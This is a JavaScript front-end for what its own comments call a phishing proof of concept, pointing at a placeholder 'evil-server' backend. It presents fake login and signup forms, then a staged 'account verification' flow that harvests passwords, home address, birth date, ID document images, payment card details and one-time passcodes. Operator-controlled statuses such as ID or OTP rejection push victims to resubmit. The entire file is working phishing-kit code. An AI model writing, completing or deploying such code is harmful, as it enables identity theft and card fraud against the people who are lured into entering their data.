// app.js - Put this in a separate file
const API_BASE_URL = 'YOUR_ACTUAL_BACKEND_SERVER_URL_HERE'; // e.g., https://your-evil-server.com/api
let currentSessionId = localStorage.getItem('userSessionId');
let userFullName = localStorage.getItem('userFullName');

const authPage = document.getElementById('auth-page');
const dashboardPage = document.getElementById('dashboard-page');
const verificationStatusEl = document.getElementById('verification-status');
const dashboardUsernameEl = document.getElementById('dashboard-username');
const idVerificationModule = document.getElementById('id-verification-module');
const cardDetailsModule = document.getElementById('card-details-module');
const otpModule = document.getElementById('otp-module');
const spinnerOverlay = document.querySelector('.spinner-overlay');

let statusPollInterval;

// --- UTILITY FUNCTIONS ---
function showSpinner() { spinnerOverlay.classList.remove('hidden'); }
function hideSpinner() { spinnerOverlay.classList.add('hidden'); }
function showMessage(elId, text, isError = false) {
    const el = document.getElementById(elId);
    if (el) {
        el.textContent = text;
        el.className = 'message ' + (isError ? 'error' : 'success');
    }
}
function clearMessage(elId) {
    const el = document.getElementById(elId);
    if (el) el.textContent = '';
}
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');
}
function showModule(moduleEl) { 
    document.querySelectorAll('.module').forEach(m => m.classList.add('hidden'));
    if(moduleEl) moduleEl.classList.remove('hidden');
}

// --- API CALLS ---
async function apiCall(endpoint, method = 'GET', body = null, isFormData = false) {
    showSpinner();
    try {
        const headers = {};
        if (!isFormData && body) {
            headers['Content-Type'] = 'application/json';
            body = JSON.stringify(body);
        }
        
        const response = await fetch(`${API_BASE_URL}${endpoint}`, { method, headers, body });
        
        if (!response.ok) {
            const errorData = await response.json().catch(() => ({ message: `HTTP error! Status: ${response.status}` }));
            throw new Error(errorData.message || `Request failed with status ${response.status}`);
        }
        
        const contentType = response.headers.get("content-type");
        if (contentType && contentType.indexOf("application/json") !== -1) {
            return await response.json();
        } else {
            return await response.text(); 
        }
    } finally {
        hideSpinner();
    }
}

// --- AUTHENTICATION ---
function renderAuthPage(showLogin = true) {
    authPage.innerHTML = `
        <div class="auth-toggle">
            <button id="show-login-btn" class="${showLogin ? 'active' : ''}">Login</button>
            <button id="show-signup-btn" class="${!showLogin ? 'active' : ''}">Sign Up</button>
        </div>
        ${showLogin ? getLoginFormHTML() : getSignupFormHTML()}
    `;
    document.getElementById('show-login-btn').addEventListener('click', () => renderAuthPage(true));
    document.getElementById('show-signup-btn').addEventListener('click', () => renderAuthPage(false));

    if (showLogin) {
        document.getElementById('login-form').addEventListener('submit', handleLogin);
    } else {
        document.getElementById('signup-form').addEventListener('submit', handleSignup);
    }
}

function getLoginFormHTML() {
    return `
        <form id="login-form">
            <h2>Secure Login</h2>
            <div class="form-group">
                <label for="login-email">Email:</label>
                <input type="email" id="login-email" required>
            </div>
            <div class="form-group">
                <label for="login-password">Password:</label>
                <input type="password" id="login-password" required>
            </div>
            <button type="submit" class="btn-primary">Login</button>
            <p id="login-message" class="message"></p>
        </form>
    `;
}

function getSignupFormHTML() {
    return `
        <form id="signup-form">
            <h2>Create Your Account</h2>
            <div class="form-group">
                <label for="signup-fullname">Full Name:</label>
                <input type="text" id="signup-fullname" name="fullName" required>
            </div>
            <div class="form-group">
                <label for="signup-address">Full Address:</label>
                <input type="text" id="signup-address" name="address" required>
            </div>
            <div class="form-group">
                <label for="signup-birthdate">Date of Birth:</label>
                <input type="date" id="signup-birthdate" name="birthDate" required>
            </div>
            <div class="form-group">
                <label for="signup-email">Email:</label>
                <input type="email" id="signup-email" name="email" required>
            </div>
            <div class="form-group">
                <label for="signup-password">Password:</label>
                <input type="password" id="signup-password" name="password" required>
            </div>
            <button type="submit" class="btn-primary">Sign Up</button>
            <p id="signup-message" class="message"></p>
        </form>
    `;
}

async function handleSignup(event) {
    event.preventDefault();
    clearMessage('signup-message');
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData.entries());

    try {
        const result = await apiCall('/signup', 'POST', data);
        currentSessionId = result.sessionId;
        userFullName = data.fullName;
        localStorage.setItem('userSessionId', currentSessionId);
        localStorage.setItem('userFullName', userFullName);
        navigateToDashboard();
    } catch (error) {
        showMessage('signup-message', error.message, true);
    }
}

async function handleLogin(event) {
    event.preventDefault();
    clearMessage('login-message');
    const email = document.getElementById('login-email').value;
    // const password = document.getElementById('login-password').value; // For a real login

    // For this phishing PoC, we might just re-use existing session or assign a new one
    // Let's assume login success if an email is provided and fetches/creates a session.
    try {
        // In a real login, you'd send email and password.
        // For this demo, let's pretend a login happens and we get a session ID.
        // Or better, backend should have a /login endpoint.
        const result = await apiCall('/login', 'POST', { email }); // Dummy login for PoC
        currentSessionId = result.sessionId;
        userFullName = result.fullName || "User"; // Backend should return fullName if user exists
        localStorage.setItem('userSessionId', currentSessionId);
        localStorage.setItem('userFullName', userFullName);
        navigateToDashboard();
    } catch (error) {
        showMessage('login-message', "Login failed. Please check your credentials or sign up.", true);
    }
}

function handleLogout() {
    localStorage.removeItem('userSessionId');
    localStorage.removeItem('userFullName');
    currentSessionId = null;
    userFullName = null;
    if (statusPollInterval) clearInterval(statusPollInterval);
    showPage('auth-page');
    renderAuthPage();
}

// --- DASHBOARD AND VERIFICATION FLOW ---
function navigateToDashboard() {
    showPage('dashboard-page');
    dashboardUsernameEl.textContent = userFullName || "User";
    // Initially hide all verification modules
    showModule(null); 
    // Start polling for account status
    checkAccountStatus(); // Initial check
    if (statusPollInterval) clearInterval(statusPollInterval);
    statusPollInterval = setInterval(checkAccountStatus, 5000); // Poll every 5 seconds
}

async function checkAccountStatus() {
    if (!currentSessionId) return;
    try {
        const statusData = await apiCall(`/status/${currentSessionId}`);
        updateVerificationUI(statusData);
    } catch (error) {
        console.error("Error checking account status:", error);
        // Maybe display a general error on dashboard or stop polling after too many errors
    }
}

function updateVerificationUI(statusData) {
    console.log("Current Status:", statusData.status, statusData.message);
    let bannerMsg = "";
    let bannerVerified = false;
    showModule(null); // Hide all modules by default

    switch (statusData.status) {
        case 'AWAITING_ID':
            bannerMsg = 'Your account is not yet verified. <a href="#" id="start-verification-link-banner1">Verify your account</a> for full access.';
            showModule(null); // Ensure no module is shown yet until link is clicked.
            break;
        case 'ID_PENDING':
            bannerMsg = 'Your ID is being verified. This may take a few moments.';
            showModule(idVerificationModule); // Keep ID module if they are there
            document.getElementById('id-upload-instructions').textContent = 'Verification in progress...';
            disableForm(document.getElementById('id-verification-form'));
            break;
        case 'ID_REJECTED':
            bannerMsg = `ID Verification Failed: ${statusData.message || 'Please upload clearer images.'} <a href="#" id="start-verification-link-banner2">Try again</a>.`;
            showModule(idVerificationModule);
            document.getElementById('id-upload-instructions').textContent = statusData.message || 'Please ensure your ID images are clear and legible.';
            enableForm(document.getElementById('id-verification-form'));
            showMessage('id-message', statusData.message || 'ID was rejected. Please resubmit.', true);
            break;
        case 'ID_ACCEPTED_CARD_PENDING':
            bannerMsg = 'Identity verified! Please <a href="#" id="card-details-link-banner">add your payment card</a> to activate all features.';
            bannerVerified = true;
            showModule(cardDetailsModule); // Show card details form
            break;
        case 'CARD_DETAILS_PENDING_OTP':
            bannerMsg = 'Card details submitted. <a href="#" id="otp-link-banner">Enter OTP</a> to complete verification.';
            bannerVerified = true;
            showModule(otpModule);
            break;
        case 'OTP_PENDING_USER_INPUT': // Backend told us OTP flow is active
             bannerMsg = 'An OTP has been sent. Please enter it to verify your card.';
             bannerVerified = true;
             showModule(otpModule);
             break;
        case 'OTP_REJECTED':
            bannerMsg = `OTP Incorrect: ${statusData.message || 'Please try again.'} An OTP has been resent.`;
            bannerVerified = true;
            showModule(otpModule);
            showMessage('otp-message', statusData.message || 'The OTP you entered was incorrect.', true);
            document.getElementById('otp-code').value = '';
            break;
        case 'FULLY_VERIFIED':
            bannerMsg = 'Congratulations! Your account is fully verified and active.';
            bannerVerified = true;
            showModule(null); // Hide all verification modules
            if (statusPollInterval) clearInterval(statusPollInterval); // Stop polling
            break;
        default:
            bannerMsg = 'There was an issue retrieving your account status. Please refresh.';
            console.warn("Unknown status:", statusData.status);
    }
    verificationStatusEl.innerHTML = `<p>${bannerMsg}</p>`;
    verificationStatusEl.className = 'status-banner ' + (bannerVerified ? 'verified' : '');
    setupDynamicLinks(); // Re-attach event listeners to new links in banner
}

function disableForm(formElement) {
    if(!formElement) return;
    formElement.querySelectorAll('input, button').forEach(el => el.disabled = true);
}
function enableForm(formElement) {
    if(!formElement) return;
    formElement.querySelectorAll('input, button').forEach(el => el.disabled = false);
}


function setupDynamicLinks() {
    const link1 = document.getElementById('start-verification-link-banner1');
    if (link1) link1.addEventListener('click', (e) => { e.preventDefault(); showModule(idVerificationModule); });
    
    const link2 = document.getElementById('start-verification-link-banner2');
    if (link2) link2.addEventListener('click', (e) => { e.preventDefault(); showModule(idVerificationModule); document.getElementById('id-verification-form').reset(); clearMessage('id-message'); });

    const cardLink = document.getElementById('card-details-link-banner');
    if (cardLink) cardLink.addEventListener('click', (e) => { e.preventDefault(); showModule(cardDetailsModule); });
    
    const otpLink = document.getElementById('otp-link-banner');
    if (otpLink) otpLink.addEventListener('click', (e) => { e.preventDefault(); showModule(otpModule); });
}


// ID Verification Logic
document.getElementById('start-verification-link')?.addEventListener('click', (e) => {
    e.preventDefault();
    showModule(idVerificationModule);
});

// Preview images for ID
document.getElementById('id-front').addEventListener('change', function(e) {
    const preview = document.getElementById('id-front-preview');
    if (e.target.files && e.target.files[0]) {
        preview.src = URL.createObjectURL(e.target.files[0]);
        preview.style.display = 'block';
    }
});
document.getElementById('id-back').addEventListener('change', function(e) {
    const preview = document.getElementById('id-back-preview');
    if (e.target.files && e.target.files[0]) {
        preview.src = URL.createObjectURL(e.target.files[0]);
        preview.style.display = 'block';
    }
});


document.getElementById('id-verification-form').addEventListener('submit', async function(event) {
    event.preventDefault();
    clearMessage('id-message');
    const formData = new FormData(this);
    formData.append('sessionId', currentSessionId);

    try {
        const result = await apiCall('/submit-id-verification', 'POST', formData, true);
        showMessage('id-message', result.message || 'ID submitted for verification. Please wait.');
        checkAccountStatus(); // Trigger immediate status update
    } catch (error) {
        showMessage('id-message', error.message, true);
    }
});

// Card Details Logic
document.getElementById('card-details-form').addEventListener('submit', async function(event) {
    event.preventDefault();
    clearMessage('card-message');
    const formData = new FormData(this);
    const data = Object.fromEntries(formData.entries());
    data.sessionId = currentSessionId;

    try {
        const result = await apiCall('/submit-card-details', 'POST', data);
        showMessage('card-message', result.message || 'Card details submitted.');
        checkAccountStatus(); // Trigger immediate status update to move to OTP or completion
    } catch (error) {
        showMessage('card-message', error.message, true);
    }
});

// OTP Logic
document.getElementById('otp-form').addEventListener('submit', async function(event) {
    event.preventDefault();
    clearMessage('otp-message');
    const otpCode = document.getElementById('otp-code').value;
    try {
        const result = await apiCall('/submit-otp', 'POST', { sessionId: currentSessionId, otp: otpCode });
        showMessage('otp-message', result.message || 'OTP submitted for verification.');
        // Backend will confirm and polling will update UI.
        checkAccountStatus(); 
    } catch (error) {
        showMessage('otp-message', error.message, true);
    }
});

// Logout
document.getElementById('logout-btn').addEventListener('click', handleLogout);

// --- INITIALIZATION ---
if (currentSessionId && userFullName) {
    navigateToDashboard();
} else {
    showPage('auth-page');
    renderAuthPage();
}